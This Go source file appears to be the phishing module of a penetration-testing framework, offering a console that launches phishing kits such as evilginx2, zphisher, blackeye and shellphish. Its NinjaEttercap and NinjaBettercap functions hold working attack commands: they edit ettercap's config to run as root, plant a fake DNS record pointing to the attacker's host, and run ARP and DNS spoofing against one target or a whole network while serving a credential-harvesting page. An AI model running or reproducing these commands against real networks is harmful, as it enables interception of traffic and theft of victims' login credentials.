package phishers

import(
    "os"
    "fmt"
    "utils"
    "menus"
    "bufio"
    "banners"
    "strings"
    "bcolors"
    "scriptures"
    "subprocess"
)

var(
    Name = "beef"
    Pass = "Jesus"
    Iface = "eth0"
    LPort = "9999"
    Spoofer = "ettercap"
    FakeDns = "Jesus is coming soon"

    Lhost = LhostIp
    LhostIp, _ = utils.GetDefaultIP()
    scanner = bufio.NewScanner(os.Stdin)
    Gateway, _ = utils.GetDefaultGatewayIP()
    Input, Rhost, Proxy, Function, Target string
    CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, RokyPath, WordList = utils.DirLocations()
)

var defaultValues = map[string]string{

    "rhost": "",
    "target": "",
    "function": "",
    "name": "beef",
    "iface": "eth0",
    "lport": "9999",
    "password": "Jesus",
    "spoofer": "ettercap",
    "fakedns": "Jesus is coming soon",

    "lhost": LhostIp,
    "output": OutPutDir,
}

func PhishingPentest() {
    for {
        fmt.Printf("%s%safr3%s phishers(%ssrc/pentest_%s.fn%s)%s > %s", bcolors.UNDERL, bcolors.BOLD, bcolors.ENDC, bcolors.RED, Function, bcolors.ENDC, bcolors.GREEN, bcolors.ENDC)
        scanner.Scan()
        Input = strings.TrimSpace(scanner.Text())
        buildParts := strings.Fields(strings.ToLower(Input))
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeFunction()
        default:
            utils.SystemShell(Input)
        }
    }
}

func executeCommand(cmd string) bool {
    commandMap := map[string]func(){

    "? info":               menus.HelpInfo,
    "h info":               menus.HelpInfo,
    "help info":            menus.HelpInfo,

    "v":                banners.Version,
    "version":          banners.Version,

    "s":                utils.Sleep,
    "sleep":            utils.Sleep,

    "c":                utils.ClearScreen,
    "clear":            utils.ClearScreen,
    "clear screen":      utils.ClearScreen,
    "screen clear":     utils.ClearScreen,

    "o":                utils.ListJunks,
    "junks":            utils.ListJunks,
    "outputs":          utils.ListJunks,
    "clear junks":      utils.ClearJunks,
    "clear outputs":    utils.ClearJunks,

    "logs":             subprocess.LogHistory,
    "history":          subprocess.LogHistory,
    "clear logs":       subprocess.ClearHistory,
    "clear history":    subprocess.ClearHistory,

    "? run":            menus.HelpInfoRun,
    "h run":            menus.HelpInfoRun,
    "info run":         menus.HelpInfoRun,
    "help run":         menus.HelpInfoRun,

    "use":              menus.HelpInfoUse,
    "? use":            menus.HelpInfoUse,
    "h use":            menus.HelpInfoUse,
    "info use":         menus.HelpInfoUse,
    "help use":         menus.HelpInfoUse,

    "? exec":           menus.HelpInfoRun,
    "h exec":           menus.HelpInfoRun,
    "info exec":        menus.HelpInfoRun,
    "help exec":        menus.HelpInfoRun,

    "? start":          menus.HelpInfoStart,
    "h start":          menus.HelpInfoStart,
    "info start":       menus.HelpInfoStart,
    "help start":       menus.HelpInfoStart,

    "? launch":         menus.HelpInfoRun,
    "h launch":         menus.HelpInfoRun,
    "info launch":      menus.HelpInfoRun,
    "help launch":      menus.HelpInfoRun,
    "? exploit":        menus.HelpInfoRun,
    "h exploit":        menus.HelpInfoRun,
    "info exploit":     menus.HelpInfoRun,
    "help exploit":     menus.HelpInfoRun,
    "? execute":        menus.HelpInfoRun,
    "h execute":        menus.HelpInfoRun,
    "info execute":     menus.HelpInfoRun,
    "help execute":     menus.HelpInfoRun,

    "set":              menus.HelpInfoSet,
    "h set":            menus.HelpInfoSet,
    "info set":         menus.HelpInfoSet,
    "help set":         menus.HelpInfoSet,

    "tips":             menus.HelpInfoTips,
    "h tips":           menus.HelpInfoTips,
    "? tips":           menus.HelpInfoTips,
    "info tips":        menus.HelpInfoTips,
    "help tips":        menus.HelpInfoTips,

    "show":             menus.HelpInfoShow,
    "? show":           menus.HelpInfoShow,
    "h show":           menus.HelpInfoShow,
    "info show":        menus.HelpInfoShow,
    "help show":        menus.HelpInfoShow,

    "info list":        menus.HelpInfoList,
    "help list":        menus.HelpInfoList,
    "use list":         menus.HelpInfoList,
    "list":             menus.HelpInfoList,

    "h option":         menus.HelpInfOptions,
    "? option":         menus.HelpInfOptions,
    "h options":        menus.HelpInfOptions,
    "? options":        menus.HelpInfOptions,
    "info option":      menus.HelpInfOptions,
    "help option":      menus.HelpInfOptions,
    "info options":     menus.HelpInfOptions,
    "help options":     menus.HelpInfOptions,

    "banner":           banners.RandomBanners,
    "g":                utils.BrowseTutarilas,
    "t":                utils.BrowseTutarilas,
    "guide":            utils.BrowseTutarilas,
    "tutarial":         utils.BrowseTutarilas,
    "h":                menus.HelpInfoMenuZero,
    "?":                menus.HelpInfoMenuZero,
    "00":               menus.HelpInfoMenuZero,
    "help":             menus.HelpInfoMenuZero,
    "f":                menus.HelpInfoFeatures,
    "use f":            menus.HelpInfoFeatures,
    "features":         menus.HelpInfoFeatures,
    "use features":     menus.HelpInfoFeatures,

    //Chameleons//
    "info":             menus.HelpInfoPhishers,

    "m":                menus.MenuSeven,
    "menu":             menus.MenuSeven,

    "option":           menus.HelpInfOptions,
    "options":          menus.HelpInfOptions,
    "show option":      menus.HelpInfOptions,
    "show options":     menus.HelpInfOptions,

    "show all":         menus.ListPhishersFunctions,
    "list all":         menus.ListPhishersFunctions,

    "func":             menus.ListPhishersFunctions,
    "funcs":            menus.ListPhishersFunctions,
    "functions":        menus.ListPhishersFunctions,
    "show func":        menus.ListPhishersFunctions,
    "list funcs":       menus.ListPhishersFunctions,
    "show funcs":       menus.ListPhishersFunctions,
    "show function":    menus.ListPhishersFunctions,
    "list function":    menus.ListPhishersFunctions,
    "list functions":   menus.ListPhishersFunctions,
    "show functions":   menus.ListPhishersFunctions,

    "module":           menus.ListPhishersFunctions,
    "modules":          menus.ListPhishersFunctions,
    "list module":      menus.ListPhishersFunctions,
    "show module":      menus.ListPhishersFunctions,
    "list modules":     menus.ListPhishersFunctions,
    "show modules":     menus.ListPhishersFunctions,


    "1":                    func() {GoPhish()},
    "run 1":                func() {GoPhish()},
    "use 1":                func() {GoPhish()},
    "exec 1":               func() {GoPhish()},
    "start 1":              func() {GoPhish()},
    "launch 1":             func() {GoPhish()},
    "exploit 1":            func() {GoPhish()},
    "execute 1":            func() {GoPhish()},
    "run gophish":            func() {GoPhish()},
    "use gophish":            func() {GoPhish()},
    "exec gophish":           func() {GoPhish()},
    "start gophish":          func() {GoPhish()},
    "launch gophish":         func() {GoPhish()},
    "exploit gophish":        func() {GoPhish()},
    "execute gophish":        func() {GoPhish()},

    "? 1":                  menus.HelpInfoGoPhish,
    "info 1":               menus.HelpInfoGoPhish,
    "help 1":               menus.HelpInfoGoPhish,
    "gophish":                menus.HelpInfoGoPhish,
    "info gophish":           menus.HelpInfoGoPhish,
    "help gophish":           menus.HelpInfoGoPhish,

    "2":                    func() {GoodGinx()},
    "run 2":                func() {GoodGinx()},
    "use 2":                func() {GoodGinx()},
    "exec 2":               func() {GoodGinx()},
    "start 2":              func() {GoodGinx()},
    "launch 2":             func() {GoodGinx()},
    "exploit 2":            func() {GoodGinx()},
    "execute 2":            func() {GoodGinx()},
    "run goodginx":           func() {GoodGinx()},
    "use goodginx":           func() {GoodGinx()},
    "exec goodginx":          func() {GoodGinx()},
    "start goodginx":         func() {GoodGinx()},
    "launch goodginx":        func() {GoodGinx()},
    "exploit goodginx":       func() {GoodGinx()},
    "execute goodginx":       func() {GoodGinx()},

    "? 2":                  menus.HelpInfoGoodGinx,
    "info 2":               menus.HelpInfoGoodGinx,
    "help 2":               menus.HelpInfoGoodGinx,
    "goodginx":               menus.HelpInfoGoodGinx,
    "info goodginx":          menus.HelpInfoGoodGinx,
    "help goodginx":          menus.HelpInfoGoodGinx,

    "3":                    func() {ZPhisher()},
    "run 3":                func() {ZPhisher()},
    "use 3":                func() {ZPhisher()},
    "exec 3":               func() {ZPhisher()},
    "start 3":              func() {ZPhisher()},
    "launch 3":             func() {ZPhisher()},
    "exploit 3":            func() {ZPhisher()},
    "execute 3":            func() {ZPhisher()},
    "run zphisher":         func() {ZPhisher()},
    "use zphisher":         func() {ZPhisher()},
    "exec zphisher":        func() {ZPhisher()},
    "start zphisher":       func() {ZPhisher()},
    "launch zphisher":      func() {ZPhisher()},
    "exploit zphisher":     func() {ZPhisher()},
    "execute zphisher":     func() {ZPhisher()},

    "? 3":                  menus.HelpInfoZPhisher,
    "info 3":               menus.HelpInfoZPhisher,
    "help 3":               menus.HelpInfoZPhisher,
    "zphisher":             menus.HelpInfoZPhisher,
    "info zphisher":        menus.HelpInfoZPhisher,
    "help zphisher":        menus.HelpInfoZPhisher,

    "4":                    func() {BlackEye()},
    "run 4":                func() {BlackEye()},
    "use 4":                func() {BlackEye()},
    "exec 4":               func() {BlackEye()},
    "start 4":              func() {BlackEye()},
    "launch 4":             func() {BlackEye()},
    "exploit 4":            func() {BlackEye()},
    "execute 4":            func() {BlackEye()},
    "run blackeye":         func() {BlackEye()},
    "use blackeye":         func() {BlackEye()},
    "exec blackeye":        func() {BlackEye()},
    "start blackeye":       func() {BlackEye()},
    "launch blackeye":      func() {BlackEye()},
    "exploit blackeye":     func() {BlackEye()},
    "execute blackeye":     func() {BlackEye()},

    "? 4":                  menus.HelpInfoBlackEye,
    "info 4":               menus.HelpInfoBlackEye,
    "help 4":               menus.HelpInfoBlackEye,
    "blackeye":             menus.HelpInfoBlackEye,
    "info blackeye":        menus.HelpInfoBlackEye,
    "help blackeye":        menus.HelpInfoBlackEye,

    "5":                    func() {AdvPhisher()},
    "run 5":                func() {AdvPhisher()},
    "use 5":                func() {AdvPhisher()},
    "exec 5":               func() {AdvPhisher()},
    "start 5":              func() {AdvPhisher()},
    "launch 5":             func() {AdvPhisher()},
    "exploit 5":            func() {AdvPhisher()},
    "execute 5":            func() {AdvPhisher()},
    "run advphisher":        func() {AdvPhisher()},
    "use advphisher":        func() {AdvPhisher()},
    "exec advphisher":       func() {AdvPhisher()},
    "start advphisher":      func() {AdvPhisher()},
    "launch advphisher":     func() {AdvPhisher()},
    "exploit advphisher":    func() {AdvPhisher()},
    "execute advphisher":    func() {AdvPhisher()},

    "? 5":                  menus.HelpInfoAdvPhisher,
    "info 5":               menus.HelpInfoAdvPhisher,
    "help 5":               menus.HelpInfoAdvPhisher,
    "advnphish":            menus.HelpInfoAdvPhisher,
    "info advnphish":       menus.HelpInfoAdvPhisher,
    "help advnphish":       menus.HelpInfoAdvPhisher,

    "6":                    func() {DarkPhish()},
    "run 6":                func() {DarkPhish()},
    "use 6":                func() {DarkPhish()},
    "exec 6":               func() {DarkPhish()},
    "start 6":              func() {DarkPhish()},
    "launch 6":             func() {DarkPhish()},
    "exploit 6":            func() {DarkPhish()},
    "execute 6":            func() {DarkPhish()},
    "run darkphish":        func() {DarkPhish()},
    "use darkphish":        func() {DarkPhish()},
    "exec darkphish":       func() {DarkPhish()},
    "start darkphish":      func() {DarkPhish()},
    "launch darkphish":     func() {DarkPhish()},
    "exploit darkphish":    func() {DarkPhish()},
    "execute darkphish":    func() {DarkPhish()},

    "? 6":                  menus.HelpInfoDarkPhish,
    "info 6":               menus.HelpInfoDarkPhish,
    "help 6":               menus.HelpInfoDarkPhish,
    "darkphish":            menus.HelpInfoDarkPhish,
    "info darkphish":       menus.HelpInfoDarkPhish,
    "help darkphish":       menus.HelpInfoDarkPhish,

    "7":                    func() {ShellPhish()},
    "run 7":                func() {ShellPhish()},
    "use 7":                func() {ShellPhish()},
    "exec 7":               func() {ShellPhish()},
    "start 7":              func() {ShellPhish()},
    "launch 7":             func() {ShellPhish()},
    "exploit 7":            func() {ShellPhish()},
    "execute 7":            func() {ShellPhish()},
    "run shellphish":        func() {ShellPhish()},
    "use shellphish":        func() {ShellPhish()},
    "exec shellphish":       func() {ShellPhish()},
    "start shellphish":      func() {ShellPhish()},
    "launch shellphish":     func() {ShellPhish()},
    "exploit shellphish":    func() {ShellPhish()},
    "execute shellphish":    func() {ShellPhish()},

    "? 7":                  menus.HelpInfoShellPhish,
    "info 7":               menus.HelpInfoShellPhish,
    "help 7":               menus.HelpInfoShellPhish,
    "shellphish":             menus.HelpInfoShellPhish,
    "info shellphish":        menus.HelpInfoShellPhish,
    "help shellphish":        menus.HelpInfoShellPhish,

    "8":                    func() {SetoolKit()},
    "run 8":                func() {SetoolKit()},
    "use 8":                func() {SetoolKit()},
    "exec 8":               func() {SetoolKit()},
    "start 8":              func() {SetoolKit()},
    "launch 8":             func() {SetoolKit()},
    "exploit 8":            func() {SetoolKit()},
    "execute 8":            func() {SetoolKit()},
    "run setoolkit":       func() {SetoolKit()},
    "use setoolkit":       func() {SetoolKit()},
    "exec setoolkit":      func() {SetoolKit()},
    "start setoolkit":     func() {SetoolKit()},
    "launch setoolkit":    func() {SetoolKit()},
    "exploit setoolkit":   func() {SetoolKit()},
    "execute setoolkit":   func() {SetoolKit()},

    "? 8":                  menus.HelpInfoSetoolKit,
    "info 8":               menus.HelpInfoSetoolKit,
    "help 8":               menus.HelpInfoSetoolKit,
    "setoolkit":           menus.HelpInfoSetoolKit,
    "info setoolkit":      menus.HelpInfoSetoolKit,
    "help setoolkit":      menus.HelpInfoSetoolKit,

    "9":                    func() {Thc()},
    "run 9":                func() {Thc()},
    "use 9":                func() {Thc()},
    "exec 9":               func() {Thc()},
    "start 9":              func() {Thc()},
    "launch 9":             func() {Thc()},
    "exploit 9":            func() {Thc()},
    "execute 9":            func() {Thc()},
    "run thc":      func() {Thc()},
    "use thc":      func() {Thc()},
    "exec thc":     func() {Thc()},
    "start thc":    func() {Thc()},
    "launch thc":   func() {Thc()},
    "exploit thc":  func() {Thc()},
    "execute thc":  func() {Thc()},

    "? 9":                  menus.HelpInfoThc,
    "info 9":               menus.HelpInfoThc,
    "help 9":               menus.HelpInfoThc,
    "thc":              menus.HelpInfoThc,
    "info thc":         menus.HelpInfoThc,
    "help thc":         menus.HelpInfoThc,

    "99":                   scriptures.ScriptureNarators,
    "run 99":               scriptures.ScriptureNarators,
    "use 99":               scriptures.ScriptureNarators,
    "exec 99":              scriptures.ScriptureNarators,
    "start 99":             scriptures.ScriptureNarators,
    "launch 99":            scriptures.ScriptureNarators,
    "exploit 99":           scriptures.ScriptureNarators,
    "execute 99":           scriptures.ScriptureNarators,
    "run verses":           scriptures.ScriptureNarators,
    "use verses":           scriptures.ScriptureNarators,
    "exec verses":          scriptures.ScriptureNarators,
    "start verses":         scriptures.ScriptureNarators,
    "launch verses":        scriptures.ScriptureNarators,
    "exploit verses":       scriptures.ScriptureNarators,
    "execute verses":       scriptures.ScriptureNarators,

    "? 99":                 menus.HelpInfoVerses,
    "verses":               menus.HelpInfoVerses,
    "info 99":              menus.HelpInfoVerses,
    "help 99":              menus.HelpInfoVerses,
    "info verses":          menus.HelpInfoVerses,
    "help verses":          menus.HelpInfoVerses,


    }
    if action, exists := commandMap[strings.ToLower(cmd)]; exists {
        action()
        return true
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{

        "name": &Name,
        "iface": &Iface,
        "rhost": &Rhost,
        "lport": &LPort,
        "target": &Rhost,
        "proxies": &Proxy,
        "lhost": &LhostIp,
        "password": &Pass,
        "func": &Function,
        "spoofer": &Spoofer,
        "fakedns": &FakeDns,
        "module": &Function,
        "output": &OutPutDir,
        "function": &Function,
    }

    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
    } else {
        menus.HelpInfoSet()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{

        "name": &Name,
        "iface": &Iface,
        "rhost": &Rhost,
        "lport": &LPort,
        "target": &Rhost,
        "proxies": &Proxy,
        "lhost": &LhostIp,
        "password": &Pass,
        "func": &Function,
        "spoofer": &Spoofer,
        "fakedns": &FakeDns,
        "module": &Function,
        "output": &OutPutDir,
        "function": &Function,
    }
 
    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key] // Reset to default
        if *ptr != "" {
            fmt.Printf("%s => %s\n", strings.ToUpper(key), *ptr)
        }else{
            fmt.Printf("%s => %s\n", strings.ToUpper(key), "Null")
        }
    } else {
        menus.HelpInfoSet()
    }
}

func executeFunction() {
    if Function == ""{
        fmt.Printf("\n%s[!] %sMissing required parameter Function. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    PhishingPenFunctions(Function)
}

// Helper functions
func autoExecuteFunc(distro string, function string) {
    //Distro = distro
    //Function = function
    executeFunction()
}

func PhishingPenFunctions(Function string, args ...interface{}) {
    fmt.Printf("\nFunction => %s\n", Function)
    if Proxy != "" {
        fmt.Printf("PROXIES => %s\n", Proxy)
        if err := utils.SetProxy(Proxy); err != nil {
            // Error already printed by SetProxy
        }
    }

    commands := map[string]func() {

        "gophish": func() {GoPhish()},
       "goodginx": func() {GoodGinx()},
       "zphisher": func() {ZPhisher()},
       "blackeye": func() {BlackEye()},
       "advphish": func() {AdvPhisher()},
      "DarkPhish": func() {DarkPhish()},
      "setoolkit": func() {SetoolKit()},
            "thc": func() {Thc()},
     "shellphish": func() {ShellPhish()},
    }

    if action, exists := commands[Function]; exists {
        action()
    } else {
        fmt.Printf("\n%s[!] %sInvalid Function %s. Use %s'help' %sfor available Functions.\n", bcolors.YELLOW, bcolors.ENDC, Function, bcolors.DARKGREEN, bcolors.ENDC)
    }
}




func GoPhish() {
    subprocess.Popen(`gophish`)
}

func GoodGinx() {
    subprocess.Popen(`evilginx2`)
}

func Thc() {
    subprocess.Popen(`cd %s/phishers/thc/; bash thc.sh`, ToolsDir)
}

func SetoolKit() {
    subprocess.Popen(`cd %s/phishers/set/; python3 setoolkit`, ToolsDir)
}

func ZPhisher() {
    subprocess.Popen(`cd %s/phishers/zphisher/; bash zphisher.sh`, ToolsDir)
}

func BlackEye() {
    subprocess.Popen(`cd %s/phishers/blackeye/; bash blackeye.sh`, ToolsDir)
}

func ShellPhish() {
    subprocess.Popen(`cd %s/phishers/shellphish/; bash shellphish.sh`, ToolsDir)
}

func DarkPhish() {
    subprocess.Popen(`cd %s/phishers/DarkPhish/; python3 dark-phish.py`, ToolsDir)
}

func AdvPhisher() {
    subprocess.Popen(`cd %s/phishers/advphishing/; bash advphishing.sh`, ToolsDir)
}

func CyberPhish() {
    subprocess.Popen(`cd %s/phishers/cyberphish/; python3 cyberphish.py`, ToolsDir)
}

func NinjaEttercap(Lhost string, Gateway string, FakeDns string, Rhost string, Iface string, Target string) {
    scanner.Scan()
    Input := scanner.Text()
    switch strings.ToLower(Input) {
    case "0":
        return
    case "1":
        filePathO := "/etc/ettercap/etter.conf.bak_africana"
        if _, err := os.Stat(filePathO); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.conf": {
                    `ec_uid = 65534`: `ec_uid = 0`,
                    `ec_gid = 65534`: `ec_gid = 0`,
                    `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                },
            }
        utils.Editors(filesToReplacements)
        }
        filePathT := "/etc/ettercap/etter.dns.bak_africana"
        if _, err := os.Stat(filePathT); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", FakeDns, " A ", Lhost)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.dns": {
                    `# vim:ts=8:noexpandtab`: newString,
                 },
            }
        utils.Editors(filesToReplacements)
        }
        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &`, Iface, Rhost, Gateway)
        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
        fmt.Println()
        subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
    case "2":
        filePathO := "/etc/ettercap/etter.conf.bak_africana"
        if _, err := os.Stat(filePathO); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.conf": {
                    `ec_uid = 65534`: `ec_uid = 0`,
                    `ec_gid = 65534`: `ec_gid = 0`,
                    `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                },
            }
        utils.Editors(filesToReplacements)
        }
        filePathT := "/etc/ettercap/etter.dns.bak_africana"
        if _, err := os.Stat(filePathT); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", FakeDns, " A ", Lhost)
            filesToReplacements := map[string]map[string]string{
                "/etc/ettercap/etter.dns": {
                    `# vim:ts=8:noexpandtab`: newString,
                 },
            }
        utils.Editors(filesToReplacements)
        }
        fmt.Println()
        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof ///" &`, Iface)
        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
        fmt.Println()
        subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
    default:
        utils.SystemShell(Input)
    }
    fmt.Println()
}

func NinjaBettercap(Lhost string, Gateway string, FakeDns string, Rhost string, Iface string, Target string) {
    if Target == ""{
        fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    switch strings.ToLower(Target) {
    case "one":
        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active'"&`, Iface, Rhost)
        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
    case "all":
        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active'"&`, Iface)
        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
    default:
        fmt.Printf("\n%s[!] %sMissing required parameter TARGET. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
}

func NinjaPhish(Spoofer string, Lhost string, Gateway string, FakeDns string, Rhost string, Iface string, Target string) {
    if Spoofer == ""{
        fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    switch strings.ToLower(Spoofer) {
    case "ettercap":
         NinjaEttercap(Lhost, Gateway, FakeDns, Rhost, Iface, Target)
    case "bettercap":
         NinjaBettercap(Lhost, Gateway, FakeDns, Rhost, Iface, Target)
    default:
        fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
     }
}
